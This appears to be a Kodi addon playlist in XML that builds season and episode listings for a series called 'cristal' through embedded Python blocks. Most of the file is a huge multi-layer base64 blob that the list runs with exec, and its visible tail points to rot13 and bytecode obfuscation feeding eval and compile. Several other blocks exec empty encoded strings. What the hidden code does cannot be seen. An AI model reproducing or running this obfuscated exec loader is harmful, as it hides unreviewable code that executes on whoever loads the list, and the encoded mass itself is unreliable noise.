ZJUmpCNVFsb3pVMjFHZUVGUFJVZE1ha2d3UVd0RlNuVklRV3c1VTBKUVowTkJTSGt6Y2xWVFYyOUtPV0ZIZDBSdFNWTlBUMGhLY1ZKSVVVMU5XREJYUmtSNll6VmFNRTAxU2xWeGEwd3pSV1J3UzNVeFJUSjVha1poVmpKd1IzbG1Sa2cxYlhGS2NVcEZVSEJCVUhvNWJFeEtRV1pOUms0NVZsQndNa0YzY0RGQlIwUXhRbEZhYWtGUmRERmFSMDExV25wTU1rMTNUWGRCZDBnd1FsRkZla0ZSZURKYWQxb3dRVkZXYlVKUlNHdGFiVll5UWxGRmVscHRlRzFhZDNBd1FWRjRNa0ZIVFhaQlVVd3hXbEZKZFVGSFdqQk5SM0F4V20xT01reEhUREpCZWxveFduZE1iRUYzUkRKTlIwZzBRWGQwTTBGSFdqSkJkMGd5UVZGRU1VRjZTR3hNZDFvd1FYcEVNa0YzUkROQmQwd3lURWRhYlVGSGNETkNVVTE0UVhwSU1scHRSREJhZWxZd1dtMUVNMEZ0VERKYWJVVjRXbTFXTUVKUlNHcGFiWGd3UVhkYWFrRlJWakpCUjFkMlFWRklNbHB0VjNaQlVVZ3hXa2RJTWxwdGNESk1SMW96UVcxd00wRnRTRzFCUjB3eVFYZGFiVnA2VERKYWQxb3hXbTFJTVVGSFREUmFiVnBzVFhkRU5VRjZXakphUjB4c1dtMTBNRnBIVEd0QmQzUnRRVkZhYlVGdFJESk1kMDE2UVhkV01VSlJUWFZCVkVneldsRkViRUZSUkRGYWJVMTJRVWRJTTBGUlNETkJVWEF3V2tkSU1FRkhjREpCYlVnMFFYZDBmUTRBQUZFeFRXcGpNRTVIUlhwT2VsVXhUbFJaTUUxcVkzbE9WR013V2xSU2JVMTZZekpPVkZrMFRrUlZNMDU2VFhsTmVra3dUbXBTYkU1dFJUSk5lbU4zVFhwQk1rNXFUVEpPYlVVd1QwUlZNVTV0V1RKTmVsbDRUbTFKTWs1VVl6Tk9SRmt5V2tSWk5VNUhUVE5OVkZKcFRYcEJNRTE2WXpST1JGa3dXV3BSZUU1SFVYcE5hbGt6VGxSQk0wNTZWVE5PYWsweFQxUk5lVTU2YTNwT1ZHTjRUbXByZWs5VVVUTk9SMWt4VGxSU2FFNTZVVEJaZWxFeFRrUnJNbHBFV1ROT1YwVjVXV3BSTTA1SFVYcE9lbFV3VG1wSmVrMXFWbWhPVkdzd1RWUlJlazVFU1RCT2FtTjZUakpGTWsxVVl6Qk9WRUV4VFZSWk5VNXRTVE5OVkZsNVRsUnJNRTVFU20xT2FrVXlUbXBOZVU1NlJURk5SRmsxVGtkWmVrNUVVVFZPUkZrelQwUlZlazE2UlRKT2FsVXpUbTFGTTA1cVRYZE9SRmt5VFZSUmVVNUhUVE5OYWxVMFRrUmpNazlVVlRWT1YwVXhUbnBWTUU1SFZUQmFSRkV6VFhwRk1GcFVVVFJPZWxGNlRWUk5NRTE2WXpKTlZGSnJUbFJyTUZsVVRUVk9lbFV4VDFSWmVVNUhWVEpPZWxGNVRsUm5NVTVVWTNsT2JWVXlUV3BWTVU1NlFUTk9SRkV4VFhwUk1rNTZXVEJPYlZrelRYcGpNRTVFWXpCUFZGcHJUbTFWTVZsVVdURk9SRVV5V1ZSTmVVNXFaekZQUkZGNFRsUkpNRnBVV20xT2JWVXdXa1JSZUU1SFJUTk5SR015VGxSSmVrNXFUVFZPUjBrd1RrUlJORTVFUlhwTmVsSm9UbnBOZVZwcVl6Tk9SRmt4VFVSVk1rNXFhekJhYWxFeFRrUkZlazE2WXpWT1JHc3dXWHBqZUU1RVNUQk9SRTB6VGxSTk1GbDZVWGxPUjAwelRrUlpOVTVFU1RGUFZGRjVUa2RKZWsxVVdtaE9WR013V2xSU2FrNXRWVEpQUkZVeVRtMVpNazE2VFRGT1Ixa3hUWHBaZUU1VVZUSlBSRmt5VGtSRk1rMTZVVFZPVkVrd1QwUlZOVTVVWjNwTmFscHJUa2RWTWxwcVRYbE9hbU15V21wUmVFMTZTVE5PUkZab1RtcEpNVTVVVFhoT2VrMHpUbFJSZVU1VWF6QlplbEY2VGtSak1FMVVWVEZPZWtVeFRWUlJORTVVUlRGUFZFMDFUbnBSTWs5VVdUTk9SRVV3VGxSa2FFNVVTVE5OZWxrelRsUlJlazFVWTNkT1ZHY3dXV3BSTWs1RVRUTk5lbGsxVG0xVk0wMTZXVE5PUjAweVRWUlZOVTVFYXpCUFJGSnBUbXByTTA5RVl6Uk9WRTB4VFZSYWJFMTZaekZQVkZVMVRsZEZNRTVVVlhkT1JFVXpXVlJSTlU1dFdUSk9lbEV6VGtkVk1scEVXVEpPUkdzd1RWUktiVTVFU1RGTmVtTjVUbFJSTVU5VVVYbE9ha2t4VDBSVk5FNXRWWHBOZWxGNVRrUnJNMDVFU20xT1ZGVXdUbFJWTTA1NmF6Rk9SR042VGtSTmVrNTZTbWxOZW1Nd1RXcFNhMDVIVlRCT1JHTXpUa2RWTWs1NlZUQk5la2t4VG5wak5VNXFhekZPZWsxNVRucEpNMDlVV20xTmVsRXlUV3BaZVU1NlFUQlplazAwVGxSck1scHFWWHBPYWxrd1RXcFdhRTE2VFROT1JGRXdUbXBOTUU5VVZUQk5lbWN5V1ZSVk5FNVhSVEZPVkZFeFRucE5NVTE2V1RWT2FsRjZUMVJSZUU1RVozcFBWR040VGxSbk1VMXFWWGhPVkZVd1RsUmpNMDVVWnpGTmFsRjVUbXBSTVUxRVdYbE5lbU13VDFSVmVrNUVaM3BPVkZFeVRrZFJNRmxVVVRCT2FtTXlXVlJSZVUxNlVUQlBSRTAxVGtkSk1GcHFTbTFPUkVVeFRWUlplazVFU1RCYWFtTTFUbFJuTUU1cVdtbE5la0Y2VFZSak0wNVVWVEJOYW1OM1RYcFpNMDFxVVRGT1IxVXlXVlJSTVU1Nlp6SmFhbEpzVFhwWk1VMUVXVE5PYW1jelRsUlpNMDVVVVRCT1JHTTFUbFJOZWs1RVdtaE9SRkV3V1ZSUk5VNUhSVE5QUkZWNlRtMVZNRTFxVVRWT2FrMHdUVlJWTVUxdFNYcE5SRlY1VG0xRk1FNTZXVEJPUkVVeFRtcE5ORTVFUlRKTmFsRjVUbFJOZWs1VVVUVk5lbU16VFVSU2FrNUVWVEJOZWswelRrUkZNbHBVVlRWT2VrVXlUbXBOZUU1SFJYcFBWRmt6VG5wVk0wNUVVVEZPYWtreFQxUlNhazVxUlROTmVsbDZUbXBuTUU5RVRYbE9SRTB3VG5wWk5FNTZXVE5OYW1NelRtcHJNMDlFVFRCT1ZHY3dXbXBXYUUxNmF6SlpWRkY2VGxSak0wMVVaR2hPYlVreVRsUlplRTVxWXpKWmFtTTBUa1JaZWs5RVVtbE9lbU15VDFSTmVVNXFSVEpaVkdNd1RrUk5NRTVFWXpCT1JFa3hUWHBhYVU1RVdUSk9hbEUwVGtSamVrOVVXbWxOZW1zd1dXcGpNazVVVlRGUFZHTTBUbFJWTWsxVVdYbE9WR2N5VDBSUk5FNUhVVEJQVkZVd1RYcEJNbHBxV214T2JVMHdUMVJTYkU1NlVUTlBSRkY2VG5wWk1FMXFXVEZPZW1jd1dYcFpNRTV0UlRGT1ZFMTRUbXBaTUZscVdYbE5lbWN3V1dwamVrNXRXVE5QUkZFd1RYcFpNRTE2VlhkT2JVVXpUVVJWTTA1SFNURlBWRkY2VGtkRk1FMXFVVEJOZWtGNlRucE5NVTVIVlRKT1JGVTBUbTFGTUU1Nll6Uk9iVmt5VFdwUk1VNUVSVE5aVkZVeFRYcG5NbGxVV21sT1JGVXpUMVJqTTA1NlNUQk9WRkV3VG1wTmVrNUVXbWhPVkdjeVQxUmpkMDU2UlhwT2VrcHBUbTFKZWs5RVRUQk9SMGt6VFhwU2JFNVVRVE5QVkZreFRrZFpNRnBFV1hwT1IwMHlUMVJhYVU1NlRURlpWRmw1VGxSak1GbFVUVFJPYW1Nd1RXcEthVTV0VFRCTmFsVTFUbnBqTVU5VVVteE9SMVY2VDBSUk1rNXFXVEpaVkdSb1RsUkZNRTlVU21sT2JVVXdXV3BaTUU1SFRYbFphbFY0VG0xVk1FNTZXbXRPYlZVeFQxUlpNMDVFVFRGT1JGbDRUakpGTTA1NlZYcE9iVVV5VFZSVmVFMTZRWGxhYW1NeFRucGpNVTFxV1RKT1JFVXlUbXBTYTA1NlJYbFphbEUxVFhwTk1sbHFZelJPTWtVeVRtcGFhazVFVlRGTlJGazFUbXBGZWs1RVl6Vk9hbWN3VGtSak0wNTZaekphUkZwcVRsUkplazFVVW0xT1Iwa3lUWHBhYUU1dFdUSlplazE1VGtSWk1FNUVZM2hPYWsweFRtcGplRTU2YTNwTlJGVTBUWHBWTVUxRVl6Vk9WMFY2VGtSU2FFNTZRVE5aVkZrMFRrUkZlazE2VW1oT1JFbDVXbXBSZWs1cVNYcE9hbFY0VFhwak1rOUVZekZPUkUweVdsUldhRTVVYXpKT1ZGRTFUbFJaTVU1NlZURk9SMDE2VG5wUmVFNTZTVE5QUkZsNVRtMVJNRnBxVVRGT01rVjZUVVJaTVU1dFVUTk9WR04zVG1wRk1scHFWWHBPYW1NeVRtcGFiVTVVVVhsYWFsRjVUbFJGTVU5VVVtcE9SRmt3VFhwak1FMTZaM3BOUkZab1RucFJNRTVVVlhoT2VrRjZUbXBWZWsxNmF6TlBWRkY0VG5wVk1FMXFZekpPUjBreVRYcFZOVTU2UVRKWlZGRXhUbFJyTTA5RVZUQk5lazB5V1hwUk0wMXRTVEJOZWxreFRrUm5NazlVVW10T2FtTjZUWHBqTlU1NlJUQk5lbU16VGxSUk1VNUVXVEZPYlZrelRtcFJNMDVYUlROTmFscG9Ua1JuTWxwRVVYcE9WRUV5VGxSYWJVNTZXVEpaZWxFeFRXMUpNbGxxVVRKT2VtTjZUVVJaTUU1cVl6QlBSRmw2VGtkTk1VMTZVWHBPZWxreVRtcFpNazV0V1RKTmVtTjZUbnBuTUU1cVVtdE5la2w2VDFSUmVVMTZVVEpaVkZreFRucEpNazFVV21wT1Ixa3dXVlJOTWs1VVVURlBSRlpvVFhwSk1FMTZWWGxPYWtVeFRYcGFiRTVFVFRKYVJGSnNUbXByZWs5RVl6Tk9WRWt6VFdwYWFrNUhSVEJhVkZwdFRrUlJNazlVVVRGT2Fra3hUbnBqTTA1cVJURk9WRlY1VGtSWmVrOUVVVFZPYlVVelRsUlNiRTVVYXpOUFZGSnJUa2RWZWsxcVRUVk5la2t4VFZSTk1rNXFTVE5QVkZrMFRucE5NVmxVVVRGT1IxVXpUbXBOZVU1cWEzcE9SRnByVG0xTk1VMUVXVEZPUjBreFRrUk5lVTVIV1RKYWFscHNUbXBqTTAxVVVteE9hbU14VFdwYWJFNXRVVEZOYWswd1RrZFZlazFFVlRKT2FtY3dUbXBOZVUxNlp6QmFhbGswVGtkWk0wNUVXbTFPVkZFeVdsUlZOVTR5UlhwUFJHTjRUbXBaTVU1VVdUVk5iVWw2VGxSVmVVMTZXVEJaZWxGNFRtcFplazlVVlhkTmVtY3lUbFJaTTA1VVdUQk9ha3B0VGxSTmVrMUVWVFJOZW1zeVRWUmFhRTVxWnpGTlJGVXlUa2ROTTAxNlZYaE5lbU42VFZSVmVVNVVRVEJPVkZab1RYcEJNVTVxV21oT2VrMHlXbFJSZWs1RVZUTk9hbEY1VG5wQk1GcHFUWGRPTWtVeVQxUlZlazE2VVRKWlZGbDRUa1JWTWs1cVpHaE9hbFV4VG5wTk5VNXRVWHBOYWxrMVRYcFpNMDlFVlhkT1ZGa3lXbXBWTTA1RVl6Qk9WR016VGxSWk1VNUVXbXhPZWtFeVRYcE5NazVxV1RKTmVsa3dUbnByTWxwVVRUQk9lbWQ2VG5wYWJFNVVSVE5aVkUxM1RtMVJlazFVVVROT1IxRXlUbnBaTVUxNldURk5SRkUwVG1wbmVrNTZVWGhPUjAwelQwUlplazVFU1RCT1ZFMTRUVzFKTUZwVVVYcE9iVVV6VDBSU2FFNUhSVEZOUkZrMFRucEpNazVxWTNoT1JGRXdUMFJLYVU1RVJUQk9la3B0VFhwRk1FNTZVVFZPZWxreVQxUmFhazE2U1ROUFJGVXhUbFJWTTAxRVRURk9SMVV6VFZSUk0wMTZWVEZOYWxFd1RtcEZNRnBFVFRST2VtY3dXbXBLYVU1cVZYcE9SRkpxVGtkVk1FNVVZekpPYWtVeFQwUmFiRTU2UlRGTmFrMHlUVzFaTWs5RVVUUk9WRVV5VG1wVk1FNVVRVEZPVkUwd1RsUkpNazVxWXpKT1ZGa3dXa1JaZWs1WFJUTlBSRkV5VGxScmVrMXFVVEJPYWtVd1RXcGpORTVFUlRGUFZHTTFUbFJOTTAxVVRYcE9Na1V4VFhwUk0wNUVhekZaVkZwcVRrUlJNMDlVWTNsTmVtY3dXWHBqTTA1VVdUTk5lazAxVGxSck1rOVVXVFZPYlVrd1QwUmpNRTU2VVRGTmFrMHpUbXBSTVUxRVdtaE9SRkV6VG1wWk5FNXFXVEpaVkUxM1RYcG5NVTVxV21oT1ZHc3pUbXBhYlU1VVFUSlphbFYzVFcxSmVrNXFUVE5PZW1NeFRXcFZOVTU2WjNwTmFsazFUbnBWTTAxRVl6Uk9WRVV6VG1wVmVrNXRSVEJaVkZwcVRYcEZNRnBxWTNoT1IwbDZUMVJhYVUxNlVUTk5hbHBwVGxSQmVrOVVZM2RPVkdjelQwUlJNRTVVUVRKYVJHTjZUWHBaTWxscVVtaE9lbGt4VG5wUk1rNXFXVEphUkZWM1RucG5NbGw2V20xTmVrRXhUV3BaTTA1cVp6QlpWRkUwVFcxSk1rOVVWbWhPYlVrelRrUk5NazVVUlRKTmVtUm9UbnBWTUZwcVVURk5la2t5VDFSTk5FNXRXVEpPYWxreFRsUkpNbGxVV1hwT2JVMTZUV3BXYUU1RVp6Sk5lbGw0VGxSbmVWbHFZekZPZW1jeVQwUmpORTE2WTNwTmVscG9UbnBGTUZwcVdtMU9iVVV5VFZSUk5FNUVaekZOZWxVd1RsUkZlVmxxWTNsT1Ixa3hUWHBWTlU1VVFYcE9hbGw1VGpKRk1GcHFXWGhPYWtVeVdXcEthVTE2U1RGTmVscG9UbXBGZWs1NldUVk9SR041V1dwTmVrNTZTVEpOZWxGNlRtMUZlazVVVFhkT1IwMTZUVlJWZDAxdFNUSmFhbEY2VGtSWk1FMXFZekpPYW1ONlQwUk5NazVVWjNsWmFsSm9UWHBuZWs5VVdYbE5la2w2VG1wVk5FMTZVWHBPUkUxemZRNEFBRE5hYlhnelduZGFNRnB0V2pOQlVWb3dRVlJNTTBGdFRYVkJTbEl3VFhkSWFrRlVURzFCYlZvd1dtMTBNRUZSY0RCQlIzQnNUSGRJYWtGVVNHMUJVVnBxUVhwV00xcHRWM1pCZDB3elduZGFhMXB0VG0xQ1VVd3hRVlJFTWt4dFJYaEJWRXd6V25kRU1VRjNXakphZDNCclFWUlNNa0ZSV210QlVWb3hURWR4ZFVGM1ZqRkJiVVJyUVcxME1FeHRjRE5CZWtRd1RYZElNRUZIVm0xQ1Iwd3lRVzFJTUZwSFdqUkJkMW95UWxGSWExcHRTREZCZDBWMVFYcEViVnB0VERKQmQwUXdRVkZGZFVGdGRESkNVVWcwUVhkME1rRlJTRE5CVkVSdFFVZGFNMEZVVmpOTVIzQTFRWHBTTUZwSFNHdEJWRkl4V2xGSU5VRjNVak5hVVVReVdtMWFiVnBIVjNwYWJYUXhXbEZOZVZwdFNETkNSMHd6UVhkYU1rRlJjRzFCYlVnd1FXMU5lVUZ0ZERKYWJVZzBRVzFTTVVGUldtdEJiVkl3VFhkSU1FRlJlREpOVVVSc1FYZElNRUZIY0d4QlVYUXdUVkZJYTBGNlJHeE5kM0F5V20xME1rMTNjRFJCVVhRelFVZEZla0YzVmpCYWJWcHRRVWR3TUVKUlREUkJWRXd4UVcxTmVVRnRSREJhZDNCdFFYZFdNRTFIUkRKYWJVeHNUWGROZWtGNlVqTkJiWEJ0UVZGU00xcHRSWGRCUjFvd1RYZElNRUY2V2pKQmQwUTBRVkZ3TUUxSFJEVkJVVXd4V2tkYU5GcDZWakJCUjBnMFFXMVdNazFSV214QmJVd3dXbTFOZDFwdFRETkNSM0ExUVhkSU1rRkhjRzFCVVhReVFYZGFha0Y2U0d4TWQzQnRRVzFhTWtGSGNHdEJNbEl6V25kRmRVRkhSRzFDVVVReFFVZFNZVkZFWTJWTlMzbG5URXBuZVhCMlRqbFdVSEF5UVVwRWFrcDZWbXhDVW5WWWIxRkZWRVF5VjFWQ1MwNHliMVZPYkVneWNWbHVTM2xVUmtsT2JIRjZTVTlCZWpGblRUTkZNa2xoWTBWYU1sTjZSSGxUVDBneVRHVnhlRmRSVEVoRlVWb3lVMjVNUzA1c1drZEVNRzVVUlRSTlMwdzFRa3RYVlVkaFUxUnlTRk5vU0ZScldtNVVPVUZJTWpsaFRIb3dhVzVWVGpKTmQxZDNUVk5CTUhCNFJWbHdWRTFTUVhkTlUwRktTREZhVVZjeVJ6STVlVzVLUVd0YVNGcHFibFZPYVV4NmNHdENTM2cxUmpORlJIQlZTWFpJVTJOcGJuZHhWMFpJT1RaeVIxTjFja3BYVUhCSFFUQkZNRmRuUlZKalprZDNTREp1TWsxTldsRk1iWEZ0ZVRSSVlVRlRRVkpGVVc5S2NERlpNbmxDUWtoaU0yOHlRVTFGU210cVduZE5XazB3WnpWeFVHZG5RbFJuZGxwVmRWUkViWFZ1UmpGMU5FRjZUWGxLZWtobFFUSk1ORWhTUVVsdU1YVlNia3RCYUZreVRXeHVTRTFZUlRJNWVFZFRTVTF1U0ZOSGIxSjVVVzh3WTJGYU0xTjFSMHB3TVVSNk9WQkJTbWRyVFRJd2JGcDRPVE51TWtnMWNsUm1NRXBKWTJaeGVrMWpTWGx4VmxneVptMWFTbkZsVFRKSlZHOTNUek5hVVVVMFFWRk5SVzVLUVdaQ1NVVXpTbEpGYUUxSlkwTnZVMEYxUVZWMWVFRktkVXBCVVhWblNYb3hlVVl3TVZWdU1VbDZRbEE1TmtsU01XUmFNWGxTV0cxeFkwMUtRVFZNTWxkTFJFZDVVVWxSY1VKeGQxTnFSVWg1WkhGNlRWcENWRm95UlhwclpVRkpjV2hFZURGcVRIZzFXSEJoVTBwdk0wVnNja2g1VjBGVWVESkdZVlpwY0ZKbk5FRXlTRFZ1UzNWcFFWUnJkbGd5UVVSSFZEQXdTRXRUVlhKNmNEVkhWRTFsYjBwclFYRjNlVVJNWVZkTWNXMU1hVWd5ZEdsTVNqRXlRa3Q1U205NGNXRnhTRmQ1UVVkWFNrRkxUVXhFTUZkRVNYbEJlbkZMU1dKSlVqZzFSVEpFYW5CSFdtVnVVamxaUkcxSk1FZDZTREJHZUZOaFJXMUpTa2wzU0RSSlJtWmxibTExVjI4eWRUUk5TMFZTUVhablMyNXRUVnBFZWpnelJ6Qk1NMGQ0VjB0R1JtWXlRa2RPYkc5MlowVlpiR1p0VEVnNU1VeDRVMXBhZWsxRlRFb3hZa1I2TkRSSWQxYzJRVWc0TUVkUmVVeHlVVlp0VFhwSU1VcDZTREJIZWtocldrcFhOa3hJUlU5dVNIVk1RWHA1U0UxVFJXTktTa2d5Y0ZKTmVFSlFaMFJGZDNsdWJraEZNa3hLY1cxeWVqRklXbmhOTmtsSVUwVk1NbGRHUjNsVGFtOHpRV2x3TVVWU2NGUnFOVmd3T0d0SFNqRlpiMnhuWVhKNlJESk5NRWxEU2twVGRVZGhkVU52TURWWFRYZFRia0Y0T0RKR2VGSnRTbmh4WW5KUlUyeEJNRVY2U0hsSlQxa3pWMGxKYlVGb1dESkliRXhLWm1wdVNsZDRSVlJOWWxwSlNXaE5kMHhsUjNkSVpYQkpZMmR3U0ZZeFdERnhVa1I1Y1dOd1NGZGlUV0ZYZDAwelUzVkhTMWRSVEV0WGJFUjNlWFZHYlZwclNFbzVhVVJLTVhsdU1raHRXa2RQTVZwUlRXZHZVVmRLYmtnNWEwRXlOR3ROUzBscFNXdzVhMjR5TlVKRk1WTnFRVk5pTTNGdFFXMU5VVTFRU0hsRldFWXpWakp4TWtGWFRIaHJXRnBTV21wTmVtZFBibmRKUzNKVU9XbGFVblZWYmpKQmFFMUtVMUJZTUZkaVdqQlNNRVJLTlZWYVNERmFSMU5GVFVkUlJVVnVNVUZsVFZGeFdtOUpZMGh1U2pGV1NrbE9NVVl5Y1hWRVNuaGxXREpyU25KNE9WbEZlR05pY0cxU05IRnRTV0Z3ZW5WcWNWSkJObTh4ZVV0TWVtdGFTVkZ4YUVsS1JXWnVTVnBwU1VwVE5sb3lPV2RNYlZOalJIbFBNa1ozUVVkeWQzbDRTbUZ4WTBReFFXbEVSM2xhVFVobk1HNHdhMlpDVTNsclFYaGpaRzVUVjFSQ1UwZ3lXVEZUVmtwM1NYZEVTblZTUmpGVFVYSktPVTl3ZWpWU1drZEZOVzR3Y1V4TmJWTm5UR0ZXTUc1SmVYWmFWVVZsYmxWWFIzSjNTV2R1VWtsMlRXRlhaMGd3TVdoR01uRnBXa3ROYUVsTFFWaHhNbE5WV2t0U2FVSktTREJFUzNGdGJsSlhOWEJTT1dKdVVHZGFSbmhOZVVZelRtMUlVVTlzY2tkMVEwVjVZMnRIU0RWb1FWSm5aVVpWVFdGdU1rRjFXa3ByVEVWR09HdENVVnBzUkRCQldFZFJWakJJZW1KdFdsTnhOVWN5U1dSR01FZ3dTRE5GU1VneU5HMU1SMFY2Y0cxd2JXOTRPWGRhVlhsMlNUTlhNMWd6U0RWYU1rRnJSRE5YTVVKUmVEUlpiWGxHYmxSeE5uRjZlVmR5U1VsaFJFWm1NVUZoVTI1eVlYaGxXa1k1ZWtSSFNYWk5NMU5XY0dGd2FVWjRZMmx3TWpWamIxUm5XRzR5YW10S1ZVNWxSM2huUTBGM1UxbHViVnBwUlZOalJuSlVlRzFNWVhWdFNtRjVka2RIUVRad1lYRlZTbmd4VVhKNmVHbHhiRGxpV2pOMU1WcEhVMGhFZW1OV2NsUlhabkpHT0RKTk0zRlNjSGgxWTBwS1YxQnhiWFZoVFZJNGEwSlNRVkZDU0UxR1FrcEZTSEF5ZUdsRlZVOWFXVzFQZG01c09ESkpVbmsyUVRBMWFrUkdPVzFCVlUxdFdESldOVnA2VW0xWU1IUTBSMGxFYkc5U1pqQkJSMW96YjBwYWFtOUxVakJDUmpsaFRWSlhOa1F6UVRGTlIwRm9ibTFYZFc1UlQyRlpNMW96Y25wTk1WcEtOVEZ2TTNCbFdqQmFhWEJKVFcxSFVqQTBTSG81UkhBeFl6WnlTMEZvUWtZNFpWcFVOREZaYlVGUldUSkJaa0pIVjFGTk1ERkJURzE1U0ZwSVJXaHhTMk5JVEVveGQzQlVOVWxDVW1KcGJtdzVZVzk0T1hwdVNHcHFiblpuVUUweWEzZHVNMU5XYmt0SU1YQklVbWxNU2pocldsSkVNSEpTUlROQ1NrazFTbFZOYUc5UVoyNXhNR05SU2xJNWExa3dNRE5hVWpWWlNWQm5ia0ZTTVZsdVIzRlhSMjFYYm5CVU5WRmFNM1ZUUVVoV2FVcElRWGhhTUdkWFJraGlNMFo2TlZsYVIwMTVRVWRNWlVGSVRETkVlR2RtU25oRlVrWXllVTFFYkRnMFJWQTVha0pVZFhkd1VtWmxjbmxFYVVGM1dtbHVVRGsxYjJ3NGFVVjVSRE5DVlhsamJrdFBXVzU2VFcxSVIwMXNUVlF4WlVKS2VUSnVNbmhwYm5neFdFRkhTV3hFYlhGcmNWRk1OVUpTVW1sRWJVMUliMHBuVkZsdFRWaEViWGhyVERKNVNGcEhjRFZDVUdkc1RYWTVZVnBLZVROQ1NrVnRTVEoxU2xvd1kyeE5NbmxsV20xSWFVSkhUV1ZCTWpCc2IxVk5RM0pMWTJoSlZEQnRTVWQwYTAxMk9XUnZNMWRwU0hnNWVWbHRRWFZZYkRsdGJqTndiWEozY1U5Q1NERnRXbFJJTVc0eFVqRkhSMGxHUld4bWFWcFNZakpNYlhWUVRFZFBlVVJJUVRCQk1EaHBjSGhqYUVSM1QyTmFTbmxXYmtkd01uRjNTVnB4VkVneWJrdGpiVWhLVW1Wd1lVRmtia3ROYlVKUlJWRklkMU5zY1d3NVZIQXhWM1ZaYkdkTWNFWTVaVVpSUldoYU1raHRXVzFKWmtKR1ptVlpNblZ0YmtkNVMzQjRlR3BhYlhnMVdUTlRZMFl3YW0xWk1XSTBjSHBxYVVkNk5XcGFkamxZY2xFd1lWRkVZelp1U2psb1ZsRXdkRmN4YXpSQmJWZHdjbEZOZWt0VmRETkJVMnMwV20xVGNISlJXbTFYYWpCWWIzcEphVlpSTUhSTlMwMTFiMUIwWVV0VmRESmFlV3MwUVhkNWNISlJUWGxMVlhReVdrbHJORUZ0UVhCeVVVeHRTMVYwTWtKSmF6UkJkM2x3Y2xGWGVVdFZkRE5CU1dzMFFYcEpjSEpSVERSTFZYUXlRVWxyTkVGdGRYQnlVVTEzUzFWME1rSkphelJCZDAxd2NsRndOVXRWZEd4Q1UyczBRWHBGY0hKUlRYcExWWFF6V25sck5FRnRUM0J5VVV3MFMxVjBNa0ZKYXpSQmJVbHdjbEZ3YlV0VmRHeENTV3MwV25kT1lWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReldqRnJORnA2U1hCeVVVd3dTMVYwTWtGSmF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVmpSTFZYUXpRVk5yTkVGdFYzQnlVVXcxUzFWME1rMUphelJCZDNsd2NsRndNRXRWZEROQ1NXczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNWM0J5VVV3MVMxVjBNazFKYXpSQmQxTndjbEZ3YlV0VmRESmFNV3MwUVhkNWNISlJURFZMVlhSc1RVbHJORUZ0U1hCeVVVMTVTMVYwTWtKVGF6UkJkMGx3Y2xGd05FdFZkREpNTVdzMFFYZDVjSEpSVERKTFZYUXpRa2xyTkZwM2RYQnlVVTE2UzFWME0xcDVhelJCZDFOd2NsRk1iVXRWZERKTU1XczBRWGRKY0hKUlZqVlhiSGgwV0d4UGVYRjZVMlpZVUhGd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFF5V2pGck5FRnRRWEJ5VVZkNVMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhSc1FsTnJORUY2VjNCeVVVd3hTMVYwTTBKSmF6UkJla1Z3Y2xGTWEwdFZkREpNZVdzMFFYZEpjSEpSY0d4TFZYUnNXbE5yTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoRU1GaE5TMDExYjFCMWQyOHlNV3B1U210NVdGVmpabTVLVm1oTlZFbDNiekl4YW5CNlNXMXdiSFYyVEV0QmVVRjNSR2hNZDB3d1RWUkpkMjh5UlhsWVZFa3lURXBxWWxjeGF6UkJla2x3Y2xGTU1VdFZkREpOZG5CaldFWjRabGR0YTIxeFZWZGpiM3B3SzFkc2FtRk5TM1Y1VEd4d1kxaEVQVDEwQlFBQUFISnZkREV6Y3drQUFBQnRiM0p3YUdWMWN5QnpIQUFBQUdOdlpHVmpjeTVrWldOdlpHVW9kSEpwYm1sMGVTd2dlbWx2YmlsMEJnQUFBRzl5WVdOc1pYTWVBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaHJaWGx0WVd0bGNpQXNJSHBwYjI0cGRBTUFBQUJ1Wlc5ekNBQUFBRHh6ZEhKcGJtYytkQVFBQUFCbGVHVmpLQXNBQUFCMEJnQUFBR0poYzJVMk5IUUdBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/NfJrsxV.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
---------------------------------------------------------------------------------------------------------------------------------------

